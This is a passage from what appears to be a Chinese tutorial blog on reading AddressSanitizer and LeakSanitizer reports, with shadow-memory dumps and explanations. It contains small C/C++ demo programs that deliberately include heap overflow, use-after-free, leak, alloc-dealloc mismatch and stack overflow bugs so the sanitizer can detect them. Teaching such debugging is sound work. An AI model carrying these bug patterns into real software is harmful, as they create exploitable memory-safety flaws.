redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==3905==ABORTING<br></code></pre></td></tr></table></figure><p>其中：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">==<span class="hljs-number">3905</span>==ERROR: <span class="hljs-keyword">AddressSanitizer: </span>heap-<span class="hljs-keyword">buffer-overflow </span>on <span class="hljs-keyword">address </span><span class="hljs-number">0x603000000060</span> <span class="hljs-built_in">at</span> pc <span class="hljs-number">0x7f09040c62c3</span> <span class="hljs-keyword">bp </span><span class="hljs-number">0x7ffcf197b180</span> <span class="hljs-built_in">sp</span> <span class="hljs-number">0x7ffcf197a928</span><br>WRITE of size <span class="hljs-number">8</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x603000000060</span> thread <span class="hljs-built_in">T0</span><br></code></pre></td></tr></table></figure><p>这两行内容告诉用户，这是一个堆越界的 bug ，发生于地址 <code>0x603000000060</code> 处</p><p>接下来：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">0x603000000060</span> is located <span class="hljs-number">0</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> <span class="hljs-keyword">of</span> <span class="hljs-number">32</span>-<span class="hljs-keyword">byte</span> region [<span class="hljs-number">0x603000000040</span>,<span class="hljs-number">0x603000000060</span>)<br></code></pre></td></tr></table></figure><p>意思是，这个错误访问的地址，是 <code>32-byte region</code>的右侧，位于 <code>[0x603000000040,0x603000000060)</code>这个左闭右开的可访问区间的右端，位移为0处，即访问了右侧这个不可访问的地址。</p><p>接下来：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">SUMMARY: AddressSanitizer: heap-buffer-overflow ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span> <span class="hljs-keyword">in</span> __interceptor_memcpy<br></code></pre></td></tr></table></figure><p>总结：这是一个堆越界的错误，具体路径以及导致这个问题的函数被列出。</p><p>利用 shadow memory 的映射公式，可以计算</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x603000000060</span> &gt;&gt; <span class="hljs-number">3</span> + <span class="hljs-number">0</span>x7fff8000 = <span class="hljs-number">0</span>xc067fff800c<br></code></pre></td></tr></table></figure><p>而这个计算出的地址，正好对应下面列出的特别被圈出的地址</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">0x0c067fff7fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x0c067fff7ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x0c067fff8000: fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>fa fa fa<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[fa]fa fa fa<br>  0x0c067fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  0x0c067fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br></code></pre></td></tr></table></figure><p>即，该影子地址内存储的值为fa，即不可访问，但源程序进行了访问，故报错。</p><p>修改源代码，若仅前3个字节（即共32+3个字节是申请的内存空间）可访问，则此处报错是如何</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">  <span class="hljs-number">0</span>x0c087fff7<span class="hljs-symbol">ff0:</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>=&gt;<span class="hljs-number">0</span>x0c087f<span class="hljs-symbol">ff8000:</span> fa fa <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>[<span class="hljs-number">03</span>]fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c087f<span class="hljs-symbol">ff8010:</span> fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br></code></pre></td></tr></table></figure><p>很明显，此处存放的值为03，即前三个字节可访问</p><h2 id="内存泄露检测"><a href="#内存泄露检测" class="headerlink" title="内存泄露检测"></a>内存泄露检测</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// leak.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">strcpy</span>(s, <span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;string is: %s\n&quot;</span>, s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>进行编译、运行后，会生成下述报告</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">==<span class="hljs-number">3528</span>==ERROR: LeakSanitizer: detected memory leaks<br><br>Direct leak of <span class="hljs-number">100</span> <span class="hljs-keyword">byte</span>(s) in <span class="hljs-number">1</span> object(s) allocated <span class="hljs-keyword">from</span>:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa9f49d0867 in __interceptor_malloc ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">145</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x55df42973225 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/</span>leak+<span class="hljs-number">0</span>x1225)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa9f4721fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>SUMMARY: AddressSanitizer: <span class="hljs-number">100</span> <span class="hljs-keyword">byte</span>(s) leaked in <span class="hljs-number">1</span> allocation(s).<br></code></pre></td></tr></table></figure><p>发现内存泄露<code>detected memory leaks</code><br>接下来打印了泄露的位置以及泄露空间的大小</p><h2 id="UAF（use-after-free）"><a href="#UAF（use-after-free）" class="headerlink" title="UAF（use after free）"></a>UAF（use after free）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// uaf.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *s = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">free</span>(s);<br>    <span class="hljs-built_in">strcpy</span>(s, <span class="hljs-string">&quot;Hello world!&quot;</span>);  <span class="hljs-comment">// use-after-free</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;string is: %s\n&quot;</span>, s);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将指针 s 指向的空间释放后，又访问指向的空间。</p><p>以下是编译且运行后报错</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs gradle">=================================================================<br>==<span class="hljs-number">3573</span>==ERROR: AddressSanitizer: heap-use-after-free on address <span class="hljs-number">0</span>x60b0000000f0 at pc <span class="hljs-number">0</span>x7fa6785892c3 bp <span class="hljs-number">0</span>x7fff93446ed0 sp <span class="hljs-number">0</span>x7fff93446678<br><span class="hljs-keyword">WRITE</span> of <span class="hljs-keyword">size</span> <span class="hljs-number">13</span> at <span class="hljs-number">0</span>x60b0000000f0 thread T0<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa6785892c2 in __interceptor_memcpy ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025270 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1270)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br>    #<span class="hljs-number">3</span> <span class="hljs-number">0</span>x7fa67835507c in __libc_start_main_impl ..<span class="hljs-regexp">/csu/</span>libc-start.c:<span class="hljs-number">409</span><br>    #<span class="hljs-number">4</span> <span class="hljs-number">0</span>x5634c5025164 in _start (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1164)<br><br><span class="hljs-number">0</span>x60b0000000f0 is located <span class="hljs-number">0</span> bytes inside of <span class="hljs-number">100</span>-<span class="hljs-keyword">byte</span> region [<span class="hljs-number">0</span>x60b0000000f0,<span class="hljs-number">0</span>x60b000000154)<br>freed by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa678603517 in __interceptor_free ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">127</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025255 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1255)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>previously allocated by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0</span>x7fa678603867 in __interceptor_malloc ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>asan/asan_malloc_linux.cpp:<span class="hljs-number">145</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0</span>x5634c5025245 in main (<span class="hljs-regexp">/home/</span>stre<span class="hljs-regexp">/Desktop/u</span>af+<span class="hljs-number">0</span>x1245)<br>    #<span class="hljs-number">2</span> <span class="hljs-number">0</span>x7fa678354fcf in __libc_start_call_main ..<span class="hljs-regexp">/sysdeps/</span>nptl/libc_start_call_main.h:<span class="hljs-number">58</span><br><br>SUMMARY: AddressSanitizer: heap-use-after-free ..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>src<span class="hljs-regexp">/libsanitizer/</span>sanitizer_common/sanitizer_common_interceptors.inc:<span class="hljs-number">827</span> in __interceptor_memcpy<br>Shadow bytes around the buggy address:<br>  <span class="hljs-number">0</span>x0c167fff7fc0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7fd0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7fe0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff7ff0: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>  <span class="hljs-number">0</span>x0c167fff8000: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd<br>=&gt;<span class="hljs-number">0</span>x0c167fff8010: fd fd fd fd fd fa fa fa fa fa fa fa fa fa[fd]fd<br>  <span class="hljs-number">0</span>x0c167fff8020: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>  <span class="hljs-number">0</span>x0c167fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa<br>Shadow <span class="hljs-keyword">byte</span> legend (one shadow <span class="hljs-keyword">byte</span> represents <span class="hljs-number">8</span> application bytes):<br>  Addressable:           <span class="hljs-number">00</span><br>  Partially addressable: <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">04</span> <span class="hljs-number">05</span> <span class="hljs-number">06</span> <span class="hljs-number">07</span> <br>  Heap left redzone:       fa<br>  Freed heap region:       fd<br>  Stack left redzone:      f1<br>  Stack mid redzone:       f2<br>  Stack right redzone:     f3<br>  Stack after <span class="hljs-keyword">return</span>:      f5<br>  Stack use after scope:   f8<br>  Global redzone:          f9<br>  Global init order:       f6<br>  Poisoned by user:        f7<br>  Container overflow:      fc<br>  Array cookie:            ac<br>  Intra object redzone:    bb<br>  ASan internal:           fe<br>  Left alloca redzone:     ca<br>  Right alloca redzone:    cb<br>  Shadow gap:              cc<br>==<span class="hljs-number">3573</span>==ABORTING<br></code></pre></td></tr></table></figure><p>asan 明确地指出了发生错误及地址是<code>AddressSanitizer: heap-use-after-free on address 0x60b0000000f0 </code></p><p>这个地址是在被释放的区域内<code>0x60b0000000f0 is located 0 bytes inside of 100-byte region [0x60b0000000f0,0x60b000000154)freed by thread T0 here</code></p><h2 id="分配释放不匹配"><a href="#分配释放不匹配" class="headerlink" title="分配释放不匹配"></a>分配释放不匹配</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// bad_delete.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">char</span> *cstr = new <span class="hljs-type">char</span>[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">strcpy</span>(cstr, <span class="hljs-string">&quot;Hello World&quot;</span>);<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; cstr &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br><br>    delete cstr;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该程序分配内存时使用的是<code>new[]</code>而释放时使用的不是<code>delete[]</code>，造成释放不完全。</p><p>其错误信息是</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arduino">=================================================================<br>==<span class="hljs-number">2180936</span>==ERROR: AddressSanitizer: alloc-dealloc-<span class="hljs-built_in">mismatch</span> (<span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span> [] vs <span class="hljs-keyword">operator</span> <span class="hljs-keyword">delete</span>) on <span class="hljs-number">0x60b0000000f0</span>     <span class="hljs-comment">// 1</span><br>    #<span class="hljs-number">0</span> <span class="hljs-number">0x7fa9f877cc65</span> in <span class="hljs-keyword">operator</span> <span class="hljs-built_in">delete</span>(<span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">177</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0x55d09d3fe33f</span> in main /home/chenbing/Code/test/bad_delete.cpp:<span class="hljs-number">10</span><br>    #<span class="hljs-number">2</span> <span class="hljs-number">0x7fa9f8152082</span> in __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span><br>    #<span class="hljs-number">3</span> <span class="hljs-number">0x55d09d3fe20d</span> in _start (/home/chenbing/Code/test/bad_delete+<span class="hljs-number">0x120d</span>)<br><br><span class="hljs-number">0x60b0000000f0</span> is located <span class="hljs-number">0</span> bytes inside of <span class="hljs-number">100</span>-<span class="hljs-type">byte</span> region [<span class="hljs-number">0x60b0000000f0</span>,<span class="hljs-number">0x60b000000154</span>)       <span class="hljs-comment">// 2</span><br>allocated by thread T0 here:<br>    #<span class="hljs-number">0</span> <span class="hljs-number">0x7fa9f877b787</span> in <span class="hljs-keyword">operator</span> <span class="hljs-keyword">new</span>[](<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">107</span><br>    #<span class="hljs-number">1</span> <span class="hljs-number">0x55d09d3fe2e5</span> in main /home/chenbing/Code/test/bad_delete.cpp:<span class="hljs-number">6</span><br>    #<span class="hljs-number">2</span> <span class="hljs-number">0x7fa9f8152082</span> in __libc_start_main ../csu/libc-start.c:<span class="hljs-number">308</span><br><br>SUMMARY: AddressSanitizer: alloc-dealloc-mismatch ../../../../src/libsanitizer/ASAN/ASAN_new_delete.cc:<span class="hljs-number">177</span> in <span class="hljs-keyword">operator</span> <span class="hljs-built_in">delete</span>(<span class="hljs-type">void</span>*, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)<br>==<span class="hljs-number">2180936</span>==HINT: <span class="hljs-keyword">if</span> you don<span class="hljs-number">&#x27;</span>t care about these errors you may set ASAN_OPTIONS=alloc_dealloc_mismatch=<span class="hljs-number">0</span><br>==<span class="hljs-number">2180936</span>==ABORTING<br></code></pre></td></tr></table></figure><p>错误类型：<code>alloc-dealloc-mismatch</code>,地址为<code>0x60b0000000f0</code></p><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sbo.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span> &#123;<br>    <span class="hljs-type">int</span> stack_array[<span class="hljs-number">100</span>];<br>    stack_array[<span class="hljs-number">101</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在栈伤创建了大小为100字节的数组，但在超过其范围的地方进行写入1</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs tap">~/Code/test$ g++ sbo.c -o sbo -fsanitize=address -g<br>chenbing@GreatDB-CB:~/Code/test$ ./sbo <br>=================================================================<br>==2196928==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc33777f24 at pc 0x562dccb592b6 bp 0x7ffc33777d40 sp 0x7ffc33777d30    1)<br>WRITE of size<span class="hljs-number"> 4 </span>at 0x7ffc33777f24 thread T0<br>    <span class="hljs-comment">#0 0x562dccb592b5 in main /home/chenbing/Code/test/sbo.c:6</span><br>    <span class="hljs-comment">#1 0x7f45bf52d082 in __libc_start_main ../csu/libc-start.c:308</span><br>    <span class="hljs-comment">#2 0x562dccb5910d in _start (/home/chenbing/Code/test/sbo+0x110d)</span><br><br>Address 0x7ffc33777f24 is located in stack of thread T0 at offset<span class="hljs-number"> 452 </span>in frame    2)<br>    <span class="hljs-comment">#0 0x562dccb591d8 in main /home/chenbing/Code/test/sbo.c:4</span><br><br>  This frame has<span class="hljs-number"> 1 </span>object(s):     3)<br>    [48, 448) &#x27;stack_array&#x27; (line 5) &lt;== Memory access at offset<span class="hljs-number"> 452 </span>overflows this variable<br>HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork  4)<br>      (longjmp and C++ exceptions *are* supported)<br>SUMMARY: AddressSanitizer: stack-buffer-overflow /home/chenbing/Code/test/sbo.c:6 in main<br>Shadow bytes around the buggy address:    5)<br>  0x1000066e6f90:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fa0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 f1 f1 f1 f1<br>  0x1000066e6fb0: f1 f1<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fc0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6fd0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>=&gt;0x1000066e6fe0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00[f3]f3 f3 f3 f3 f3 f3 f3<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<br>  0x1000066e6ff0:<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span 